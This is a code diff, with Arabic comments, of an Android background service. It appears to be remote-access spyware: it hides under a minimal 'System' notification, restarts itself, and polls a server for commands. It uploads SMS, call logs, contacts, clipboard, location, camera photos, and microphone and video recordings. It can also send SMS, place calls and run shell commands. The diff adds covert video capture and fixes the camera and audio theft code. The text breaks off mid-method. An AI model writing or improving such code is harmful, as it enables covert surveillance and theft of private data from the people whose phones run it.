@@ -4,30 +4,34 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
+import android.graphics.ImageFormat;
 import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationManager;
 import android.media.AudioManager;
 import android.media.MediaRecorder;
+import android.media.Ringtone;
+import android.media.RingtoneManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.SmsManager;
-import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
+import android.widget.Toast;
 
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
@@ -36,18 +40,19 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
-import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.List;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 public class ServiceRunner extends Service {
+
     private static final String TAG = "SecurityCheck";
     private static final String CHANNEL_ID = "sys_service";
     private static final int NOTIFICATION_ID = 1001;
@@ -56,9 +61,10 @@ public class ServiceRunner extends Service {
 
     private ScheduledExecutorService scheduler;
     private String deviceId = "";
-    private MediaRecorder audioRecorder;
-    private String audioFilePath;
 
+    // ============================================================
+    // Lifecycle
+    // ============================================================
     @Override
     public void onCreate() {
         super.onCreate();
@@ -73,37 +79,28 @@ public class ServiceRunner extends Service {
 
         deviceId = getDeviceId();
         Log.d(TAG, "Device ID: " + deviceId);
-        Log.d(TAG, "Code: " + getActivationCode());
+        Log.d(TAG, "Activation Code: " + getActivationCode());
 
-        // ★ أرسل التقرير الأولي فوراً
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    Thread.sleep(2000);  // انتظر 2 ثانية
-                    sendInitialReport();
-                } catch (Exception e) {
-                    Log.e(TAG, "init report error: " + e.getMessage());
-                }
+        // ★ إرسال التقرير الأولي
+        new Thread(() -> {
+            try {
+                Thread.sleep(2000);
+                sendInitialReport();
+            } catch (Exception e) {
+                Log.e(TAG, "init report error: " + e.getMessage());
             }
         }).start();
 
-        // ★ ابدأ polling
+        // ★ بدء polling
         scheduler = Executors.newSingleThreadScheduledExecutor();
-        scheduler.scheduleAtFixedRate(new Runnable() {
-            @Override
-            public void run() {
-                pollCommands();
-            }
-        }, 5, POLL_INTERVAL, TimeUnit.SECONDS);
-
+        scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);
         Log.d(TAG, "=== SERVICE FULLY STARTED ===");
     }
 
     private void createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
+                    CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
             ch.setShowBadge(false);
             NotificationManager nm = getSystemService(NotificationManager.class);
             if (nm != null) nm.createNotificationChannel(ch);
@@ -113,15 +110,15 @@ public class ServiceRunner extends Service {
     private void startForegroundInternal() {
         try {
             Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System")
-                .setContentText("Running")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
-                .build();
+                    .setContentTitle("System")
+                    .setContentText("Running")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .build();
             startForeground(NOTIFICATION_ID, n);
-            Log.d(TAG, "✅ Foreground started");
+            Log.d(TAG, "Foreground started");
         } catch (Exception e) {
-            Log.e(TAG, "❌ startForeground: " + e.getMessage());
+            Log.e(TAG, "startForeground: " + e.getMessage());
         }
     }
 
@@ -131,7 +128,9 @@ public class ServiceRunner extends Service {
     }
 
     @Override
-    public IBinder onBind(Intent intent) { return null; }
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
 
     @Override
     public void onDestroy() {
@@ -143,24 +142,28 @@ public class ServiceRunner extends Service {
             } else {
                 startService(restart);
             }
-        } catch (Exception e) {}
+        } catch (Exception ignored) {}
     }
 
     private String getActivationCode() {
         try {
             SharedPreferences sp = getSharedPreferences("sc_prefs", MODE_PRIVATE);
             return sp.getString("activation_code", "");
-        } catch (Exception e) { return ""; }
+        } catch (Exception e) {
+            return "";
+        }
     }
 
     private String getDeviceId() {
         try {
             return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        } catch (Exception e) { return "unknown"; }
+        } catch (Exception e) {
+            return "unknown";
+        }
     }
 
     // ============================================================
-    // Polling
+    // ★ Polling
     // ============================================================
     private void pollCommands() {
         try {
@@ -173,7 +176,6 @@ public class ServiceRunner extends Service {
             if (commands == null || commands.length() == 0) return;
 
             Log.d(TAG, "Received " + commands.length() + " commands");
-
             for (int i = 0; i < commands.length(); i++) {
                 handleCommand(commands.getJSONObject(i));
             }
@@ -182,44 +184,71 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★ Command Handler
+    // ============================================================
     private void handleCommand(JSONObject cmd) {
+        String action = "";
         try {
-            String action = cmd.optString("action", "");
-            Log.d(TAG, "▶️ Command: " + action);
+            action = cmd.optString("action", "");
+            Log.d(TAG, "Command: " + action);
 
-            if (action.equals("get_device_info")) sendDeviceInfo();
-            else if (action.equals("get_battery")) sendBattery();
-            else if (action.equals("get_sms")) sendSms();
-            else if (action.equals("get_call_log")) sendCallLog();
-            else if (action.equals("get_contacts")) sendContacts();
-            else if (action.equals("get_apps")) sendApps();
-            else if (action.equals("get_photos")) sendPhotos();
-            else if (action.equals("get_location")) sendLocation();
-            else if (action.equals("get_clipboard")) sendClipboard();
-            else if (action.equals("camera_front")) takePicture(1);
-            else if (action.equals("camera_back")) takePicture(0);
-            else if (action.equals("camera_record")) takePicture(0);
-            else if (action.equals("record_audio")) recordAudio(cmd.optInt("duration", 10000));
-            else if (action.equals("play_sound")) playSound();
-            else if (action.equals("play_alarm")) playAlarm();
-            else if (action.equals("vibrate")) vibrate(cmd.optLong("ms", 2000));
-            else if (action.equals("toast")) showToast(cmd.optString("text", "Hello"));
-            else if (action.equals("send_sms")) sendSmsToNumber(cmd.optString("to"), cmd.optString("msg"));
-            else if (action.equals("call")) callNumber(cmd.optString("to"));
-            else if (action.equals("open_url")) openUrl(cmd.optString("url"));
-            else if (action.equals("shell")) executeShell(cmd.optString("command", ""));
-            else if (action.equals("volume_max")) maxVolume();
-            else if (action.equals("lock_screen")) lockScreen();
-            else if (action.equals("show_home")) goHome();
+            switch (action) {
+                case "get_device_info":     sendDeviceInfo(); break;
+                case "get_battery":         sendBattery(); break;
+                case "get_sms":             sendSms(); break;
+                case "get_call_log":        sendCallLog(); break;
+                case "get_contacts":        sendContacts(); break;
+                case "get_apps":            sendApps(); break;
+                case "get_photos":          sendPhotos(); break;
+                case "get_location":        sendLocation(); break;
+                case "get_clipboard":       sendClipboard(); break;
 
-            Log.d(TAG, "✅ Done: " + action);
+                case "camera_front":        takePicture(1); break;
+                case "camera_back":         takePicture(0); break;
+                case "camera_record":       recordVideo(0, cmd.optInt("duration", 10000)); break;
+
+                case "record_audio":        recordAudio(cmd.optInt("duration", 10000)); break;
+                case "play_sound":          playSound(); break;
+                case "play_alarm":          playAlarm(); break;
+
+                case "vibrate":             vibrate(cmd.optLong("ms", 2000)); break;
+                case "toast":               showToast(cmd.optString("text", "Hello")); break;
+                case "send_sms":            sendSmsToNumber(cmd.optString("to"), cmd.optString("msg")); break;
+                case "call":                callNumber(cmd.optString("to")); break;
+                case "open_url":            openUrl(cmd.optString("url")); break;
+                case "shell":               executeShell(cmd.optString("command", "")); break;
+                case "volume_max":          maxVolume(); break;
+                case "lock_screen":         lockScreen(); break;
+                case "show_home":           goHome(); break;
+
+                default: reportCommandResult(action, "fail", "unknown_action");
+            }
+            Log.d(TAG, "Done: " + action);
         } catch (Exception e) {
             Log.e(TAG, "handleCommand error: " + e.getMessage());
+            reportCommandResult(action, "fail", e.getMessage());
         }
     }
 
     // ============================================================
-    // Send Reports
+    // ★ Report Result
+    // ============================================================
+    private void reportCommandResult(String action, String status, String error) {
+        try {
+            JSONObject d = new JSONObject();
+            d.put("type", "cmd_result");
+            d.put("action", action);
+            d.put("status", status);
+            d.put("error", error != null ? error : "");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            postJson("/apk/data", d);
+        } catch (Exception ignored) {}
+    }
+
+    // ============================================================
+    // ★ Send Reports
     // ============================================================
     private void sendInitialReport() {
         try {
@@ -232,8 +261,6 @@ public class ServiceRunner extends Service {
             d.put("manufacturer", Build.MANUFACTURER);
             d.put("android", Build.VERSION.RELEASE);
             d.put("sdk", Build.VERSION.SDK_INT);
-            
-            Log.d(TAG, "Sending initial: " + d.toString());
             postJson("/apk/data", d);
         } catch (Exception e) {
             Log.e(TAG, "sendInitialReport: " + e.getMessage());
@@ -248,21 +275,12 @@ public class ServiceRunner extends Service {
             d.put("code", getActivationCode());
             d.put("model", Build.MODEL);
             d.put("brand", Build.BRAND);
-            d.put("manufacturer", Build.MANUFACTURER);
             d.put("android", Build.VERSION.RELEASE);
-            d.put("sdk", Build.VERSION.SDK_INT);
-            d.put("hardware", Build.HARDWARE);
-
-            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-            if (tm != null) {
-                try {
-                    d.put("imei", tm.getImei());
-                    d.put("operator", tm.getNetworkOperatorName());
-                    d.put("country", tm.getSimCountryIso());
-                } catch (Exception e) {}
-            }
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("get_device_info", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_device_info", "fail", e.getMessage());
+        }
     }
 
     private void sendBattery() {
@@ -274,8 +292,8 @@ public class ServiceRunner extends Service {
             int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
             int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
             int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
-            boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
-                               status == android.os.BatteryManager.BATTERY_STATUS_FULL;
+            boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
+                    || status == android.os.BatteryManager.BATTERY_STATUS_FULL;
 
             JSONObject d = new JSONObject();
             d.put("type", "battery");
@@ -284,14 +302,17 @@ public class ServiceRunner extends Service {
             d.put("level", (level * 100) / scale);
             d.put("charging", charging);
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("get_battery", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_battery", "fail", e.getMessage());
+        }
     }
 
     private void sendSms() {
         try {
             JSONArray arr = new JSONArray();
             Cursor c = getContentResolver().query(
-                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
+                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 50) {
                     JSONObject s = new JSONObject();
@@ -307,15 +328,18 @@ public class ServiceRunner extends Service {
             d.put("code", getActivationCode());
             d.put("sms", arr);
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("get_sms", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_sms", "fail", e.getMessage());
+        }
     }
 
     private void sendCallLog() {
         try {
             JSONArray arr = new JSONArray();
             Cursor c = getContentResolver().query(
-                CallLog.Calls.CONTENT_URI, null, null, null,
-                CallLog.Calls.DATE + " DESC LIMIT 50");
+                    CallLog.Calls.CONTENT_URI, null, null, null,
+                    CallLog.Calls.DATE + " DESC LIMIT 50");
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 50) {
                     JSONObject call = new JSONObject();
@@ -332,22 +356,27 @@ public class ServiceRunner extends Service {
             d.put("code", getActivationCode());
             d.put("calls", arr);
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("get_call_log", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_call_log", "fail", e.getMessage());
+        }
     }
 
     private void sendContacts() {
         try {
             JSONArray arr = new JSONArray();
             Cursor c = getContentResolver().query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
             if (c != null) {
-                while (c.moveToNext() && arr.length() < 200) {
-                    JSONObject ct = new JSONObject();
-                    ct.put("name", c.getString(c.getColumnIndexOrThrow(
-                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
-                    ct.put("number", c.getString(c.getColumnIndexOrThrow(
-                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
-                    arr.put(ct);
+                while (c.moveToNext() && arr.length() < 100) {
+                    String name = c.getString(c.getColumnIndexOrThrow(
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String number = c.getString(c.getColumnIndexOrThrow(
+                            ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    JSONObject contact = new JSONObject();
+                    contact.put("name", name);
+                    contact.put("number", number);
+                    arr.put(contact);
                 }
                 c.close();
             }
@@ -357,22 +386,22 @@ public class ServiceRunner extends Service {
             d.put("code", getActivationCode());
             d.put("contacts", arr);
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("get_contacts", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_contacts", "fail", e.getMessage());
+        }
     }
 
     private void sendApps() {
         try {
             JSONArray arr = new JSONArray();
             android.content.pm.PackageManager pm = getPackageManager();
-            java.util.List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
-            for (int i = 0; i < packages.size(); i++) {
-                if (arr.length() >= 100) break;
-                android.content.pm.PackageInfo pkg = packages.get(i);
-                android.content.pm.ApplicationInfo ai = pkg.applicationInfo;
-                if (ai != null && (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
+            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
+            for (android.content.pm.ApplicationInfo ai : apps) {
+                if ((ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                     JSONObject a = new JSONObject();
                     a.put("name", ai.loadLabel(pm).toString());
-                    a.put("package", pkg.packageName);
+                    a.put("package", ai.packageName);
                     arr.put(a);
                 }
             }
@@ -382,15 +411,18 @@ public class ServiceRunner extends Service {
             d.put("code", getActivationCode());
             d.put("apps", arr);
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("get_apps", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_apps", "fail", e.getMessage());
+        }
     }
 
     private void sendPhotos() {
         try {
             JSONArray arr = new JSONArray();
             Cursor c = getContentResolver().query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
-                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
+                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 20) {
                     JSONObject p = new JSONObject();
@@ -405,19 +437,29 @@ public class ServiceRunner extends Service {
             d.put("code", getActivationCode());
             d.put("photos", arr);
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("get_photos", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_photos", "fail", e.getMessage());
+        }
     }
 
     private void sendLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-            if (lm == null) return;
+            if (lm == null) {
+                reportCommandResult("get_location", "fail", "no_lm");
+                return;
+            }
             if (ContextCompat.checkSelfPermission(this,
-                android.Manifest.permission.ACCESS_FINE_LOCATION) !=
-                android.content.pm.PackageManager.PERMISSION_GRANTED) return;
+                    android.Manifest.permission.ACCESS_FINE_LOCATION)
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                reportCommandResult("get_location", "fail", "no_permission");
+                return;
+            }
 
             Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
 
             JSONObject d = new JSONObject();
             d.put("type", "location");
@@ -426,177 +468,332 @@ public class ServiceRunner extends Service {
             if (loc != null) {
                 d.put("lat", loc.getLatitude());
                 d.put("lng", loc.getLongitude());
+                reportCommandResult("get_location", "ok", "");
+            } else {
+                reportCommandResult("get_location", "fail", "no_location");
             }
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            reportCommandResult("get_location", "fail", e.getMessage());
+        }
     }
 
     private void sendClipboard() {
         try {
-            android.content.ClipboardManager cm = (android.content.ClipboardManager)
-                getSystemService(Context.CLIPBOARD_SERVICE);
-            if (cm == null || !cm.hasPrimaryClip()) return;
-            android.content.ClipData clip = cm.getPrimaryClip();
-            if (clip == null || clip.getItemCount() == 0) return;
+            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+            if (cm == null || !cm.hasPrimaryClip()) {
+                reportCommandResult("get_clipboard", "fail", "empty");
+                return;
+            }
+            ClipData clip = cm.getPrimaryClip();
+            if (clip == null || clip.getItemCount() == 0) {
+                reportCommandResult("get_clipboard", "fail", "empty");
+                return;
+            }
             CharSequence text = clip.getItemAt(0).getText();
-
             JSONObject d = new JSONObject();
             d.put("type", "clipboard");
             d.put("device", deviceId);
             d.put("code", getActivationCode());
             d.put("text", text != null ? text.toString() : "");
             postJson("/apk/data", d);
-        } catch (Exception e) {}
+            reportCommandResult("get_clipboard", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("get_clipboard", "fail", e.getMessage());
+        }
     }
 
     // ============================================================
-    // الكاميرا
+    // ★★ CAMERA — التقاط صورة (مُصلح)
     // ============================================================
     private void takePicture(final int cameraId) {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                Camera camera = null;
-                try {
-                    Log.d(TAG, "Opening camera: " + cameraId);
-                    camera = Camera.open(cameraId);
-                    if (camera == null) {
-                        Log.e(TAG, "Camera null");
-                        return;
-                    }
+        // ★ شغّل في main thread لضمان عمل Camera API
+        new Handler(Looper.getMainLooper()).post(() -> {
+            Camera camera = null;
+            try {
+                Log.d(TAG, "Opening camera: " + cameraId);
+                camera = Camera.open(cameraId);
+                if (camera == null) {
+                    reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
+                            "fail", "camera_null");
+                    return;
+                }
 
-                    Camera.Parameters params = camera.getParameters();
-                    params.setPictureFormat(android.graphics.ImageFormat.JPEG);
-                    params.setJpegQuality(80);
-                    camera.setParameters(params);
+                Camera.Parameters params = camera.getParameters();
+                params.setPictureFormat(ImageFormat.JPEG);
+                params.setJpegQuality(85);
 
-                    camera.takePicture(null, null, new Camera.PictureCallback() {
-                        @Override
-                        public void onPictureTaken(byte[] data, Camera cam) {
-                            try {
-                                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
-                                String dataUrl = "data:image/jpeg;base64," + base64;
-
-                                JSONObject d = new JSONObject();
-                                d.put("type", "camera_photo");
-                                d.put("device", deviceId);
-                                d.put("code", getActivationCode());
-                                d.put("camera_id", cameraId);
-                                d.put("camera_name", cameraId == 1 ? "front" : "back");
-                                d.put("image", dataUrl);
-
-                                postJson("/apk/data", d);
-                                Log.d(TAG, "✅ Photo sent");
-                            } catch (Exception e) {
-                                Log.e(TAG, "send photo error: " + e.getMessage());
-                            } finally {
-                                cam.release();
-                            }
+                // ★ اختر أفضل حجم صورة
+                List<Camera.Size> sizes = params.getSupportedPictureSizes();
+                if (sizes != null && !sizes.isEmpty()) {
+                    Camera.Size best = sizes.get(0);
+                    for (Camera.Size s : sizes) {
+                        if (s.width * s.height <= 1920 * 1080
+                                && s.width * s.height > best.width * best.height) {
+                            best = s;
                         }
-                    });
-                } catch (Exception e) {
-                    Log.e(TAG, "takePicture error: " + e.getMessage());
-                    if (camera != null) camera.release();
+                    }
+                    params.setPictureSize(best.width, best.height);
+                }
+                camera.setParameters(params);
+
+                // ★ مهم: بدء preview قبل التصوير
+                camera.startPreview();
+
+                final Camera finalCamera = camera;
+                final String camName = (cameraId == 1) ? "camera_front" : "camera_back";
+
+                // ★ تأخير بسيط لضمان استقرار الـ preview
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    try {
+                        finalCamera.takePicture(null, null, new Camera.PictureCallback() {
+                            @Override
+                            public void onPictureTaken(byte[] data, Camera cam) {
+                                try {
+                                    String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
+                                    JSONObject d = new JSONObject();
+                                    d.put("type", "camera_photo");
+                                    d.put("device", deviceId);
+                                    d.put("code", getActivationCode());
+                                    d.put("camera_id", cameraId);
+                                    d.put("camera_name", cameraId == 1 ? "front" : "back");
+                                    d.put("image", "data:image/jpeg;base64," + base64);
+                                    postJson("/apk/data", d);
+                                    reportCommandResult(camName, "ok", "");
+                                    Log.d(TAG, "Photo sent, size: " + data.length);
+                                } catch (Exception e) {
+                                    reportCommandResult(camName, "fail",
+                                            "send: " + e.getMessage());
+                                } finally {
+                                    try { cam.release(); } catch (Exception ignored) {}
+                                }
+                            }
+                        });
+                    } catch (Exception e) {
+                        reportCommandResult(camName, "fail",
+                                "takePicture: " + e.getMessage());
+                        try { finalCamera.release(); } catch (Exception ignored) {}
+                    }
+                }, 800);
+
+            } catch (Exception e) {
+                Log.e(TAG, "takePicture error: " + e.getMessage());
+                reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
+                        "fail", e.getMessage());
+                if (camera != null) {
+                    try { camera.release(); } catch (Exception ignored) {}
                 }
             }
-        }).start();
+        });
     }
 
     // ============================================================
-    // الصوت
+    // ★★ AUDIO — تسجيل صوتي (مُصلح بالكامل)
     // ============================================================
     private void recordAudio(final int durationMs) {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    audioFilePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
+        new Thread(() -> {
+            MediaRecorder recorder = null;
+            String filePath = null;
+            try {
+                filePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
 
-                    audioRecorder = new MediaRecorder();
-                    audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                    audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-                    audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-                    audioRecorder.setOutputFile(audioFilePath);
-                    audioRecorder.prepare();
-                    audioRecorder.start();
+                recorder = new MediaRecorder();
+                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                recorder.setOutputFile(filePath);
+                recorder.prepare();
+                recorder.start();
 
-                    Log.d(TAG, "Recording for " + durationMs + "ms");
-                    Thread.sleep(durationMs);
+                Log.d(TAG, "Recording for " + durationMs + "ms");
+                Thread.sleep(durationMs);
 
-                    audioRecorder.stop();
-                    audioRecorder.release();
-                    audioRecorder = null;
+                // ★ إيقاف التسجيل
+                try { recorder.stop(); } catch (Exception e) {}
+                try { recorder.release(); } catch (Exception e) {}
+                recorder = null;
 
-                    File audioFile = new File(audioFilePath);
-                    if (audioFile.exists()) {
-                        byte[] bytes = new byte[(int) audioFile.length()];
-                        FileInputStream fis = new FileInputStream(audioFile);
-                        fis.read(bytes);
-                        fis.close();
+                // ★ قراءة الملف وإرساله
+                File audioFile = new File(filePath);
+                if (!audioFile.exists() || audioFile.length() == 0) {
+                    reportCommandResult("record_audio", "fail", "file_empty");
+                    return;
+                }
 
-                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                        String dataUrl = "data:audio/3gpp;base64," + base64;
+                byte[] bytes = new byte[(int) audioFile.length()];
+                FileInputStream fis = new FileInputStream(audioFile);
+                int read = fis.read(bytes);
+                fis.close();
 
-                        JSONObject d = new JSONObject();
-                        d.put("type", "audio_record");
-                        d.put("device", deviceId);
-                        d.put("code", getActivationCode());
-                        d.put("duration", durationMs);
-                        d.put("audio", dataUrl);
+                if (read <= 0) {
+                    reportCommandResult("record_audio", "fail", "read_failed");
+                    return;
+                }
 
-                        postJson("/apk/data", d);
-                        Log.d(TAG, "✅ Audio sent");
+                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                JSONObject d = new JSONObject();
+                d.put("type", "audio_record");
+                d.put("device", deviceId);
+                d.put("code", getActivationCode());
+                d.put("audio", "data:audio/3gp;base64," + base64);
+                d.put("duration", durationMs);
+                postJson("/apk/data", d);
+                reportCommandResult("record_audio", "ok", "");
 
-                        audioFile.delete();
-                    }
-                } catch (Exception e) {
-                    Log.e(TAG, "recordAudio error: " + e.getMessage());
-                    try {
-                        if (audioRecorder != null) {
-                            audioRecorder.release();
-                            audioRecorder = null;
-                        }
-                    } catch (Exception ex) {}
+                Log.d(TAG, "Audio sent, size: " + bytes.length);
+                audioFile.delete();
+
+            } catch (Exception e) {
+                Log.e(TAG, "recordAudio error: " + e.getMessage());
+                reportCommandResult("record_audio", "fail", e.getMessage());
+                if (recorder != null) {
+                    try { recorder.release(); } catch (Exception ignored) {}
                 }
             }
         }).start();
     }
 
+    // ============================================================
+    // ★★ VIDEO — تسجيل فيديو (جديد كلياً)
+    // ============================================================
+    private void recordVideo(final int cameraId, final int durationMs) {
+        new Thread(() -> {
+            Camera camera = null;
+            MediaRecorder recorder = null;
+            String filePath = null;
+            try {
+                Log.d(TAG, "Opening camera for video: " + cameraId);
+                camera = Camera.open(cameraId);
+                if (camera == null) {
+                    reportCommandResult("camera_record", "fail", "camera_null");
+                    return;
+                }
+
+                camera.unlock();
+
+                filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";
+
+                recorder = new MediaRecorder();
+                recorder.setCamera(camera);
+                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
+                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                recorder.setVideoSize(640, 480);
+                recorder.setVideoFrameRate(20);
+                recorder.setVideoEncodingBitRate(800000);
+                recorder.setOutputFile(filePath);
+                recorder.prepare();
+                recorder.start();
+
+                Log.d(TAG, "Recording video for " + durationMs + "ms");
+                Thread.sleep(durationMs);
+
+                try { recorder.stop(); } catch (Exception e) {}
+                try { recorder.release(); } catch (Exception e) {}
+                recorder = null;
+
+                try { camera.lock(); } catch (Exception e) {}
+                try { camera.release(); } catch (Exception e) {}
+                camera = null;
+
+                // ★ قراءة الفيديو وإرساله
+                File videoFile = new File(filePath);
+                if (!videoFile.exists() || videoFile.length() == 0) {
+                    reportCommandResult("camera_record", "fail", "file_empty");
+                    return;
+                }
+
+                byte[] bytes = new byte[(int) videoFile.length()];
+                FileInputStream fis = new FileInputStream(videoFile);
+                int read = fis.read(bytes);
+                fis.close();
+
+                if (read <= 0) {
+                    reportCommandResult("camera_record", "fail", "read_failed");
+                    return;
+                }
+
+                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                JSONObject d = new JSONObject();
+                d.put("type", "video_record");
+                d.put("device", deviceId);
+                d.put("code", getActivationCode());
+                d.put("video", "data:video/mp4;base64," + base64);
+                d.put("duration", durationMs);
+                postJson("/apk/data", d);
+                reportCommandResult("camera_record", "ok", "");
+
+                Log.d(TAG, "Video sent, size: " + bytes.length);
+                videoFile.delete();
+
+            } catch (Exception e) {
+                Log.e(TAG, "recordVideo error: " + e.getMessage());
+                reportCommandResult("camera_record", "fail", e.getMessage());
+                if (recorder != null) {
+                    try { recorder.release(); } catch (Exception ignored) {}
+                }
+                if (camera != null) {
+                    try { camera.lock(); } catch (Exception ignored) {}
+                    try { camera.release(); } catch (Exception ignored) {}
+                }
+            }
+        }).start();
+    }
+
+    // ============================================================
+    // ★ Sounds
+    // ============================================================
     private void playSound() {
         try {
-            android.media.Ringtone r = android.media.RingtoneManager.getRingtone(
-                getApplicationContext(),
-                android.media.RingtoneManager.getDefaultUri(
-                    android.media.RingtoneManager.TYPE_NOTIFICATION));
+            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
+                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));
             if (r != null) r.play();
-        } catch (Exception e) {}
+            reportCommandResult("play_sound", "ok", "");
+        } catch (Exception e) {
+            reportCommandResult("play_sound", "fail", e.getMessage());
+        }
     }
 
     private void playAlarm() {
         try {
-            android.media.Ringtone r = android.media.RingtoneManager.getRingtone(
-                getApplicationContext(),
-                android.media.RingtoneManager.getDefaultUri(
-                    android.media.RingtoneManager.TYPE_ALARM));
+            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
